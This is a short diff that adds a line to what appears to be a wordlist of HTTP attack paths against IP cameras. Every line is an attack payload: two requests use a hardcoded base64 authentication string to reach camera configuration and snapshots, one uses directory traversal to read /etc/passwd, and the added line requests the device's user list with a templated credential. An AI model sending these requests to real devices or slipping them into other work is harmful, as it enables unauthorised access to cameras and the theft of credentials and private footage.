@@ -8,3 +8,4 @@
 /System/configurationFile?auth=YWRtaW46MTEK
 /onvif-http/snapshot?auth=YWRtaW46MTEK
 /CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+/Security/users?auth={{b64auth}}
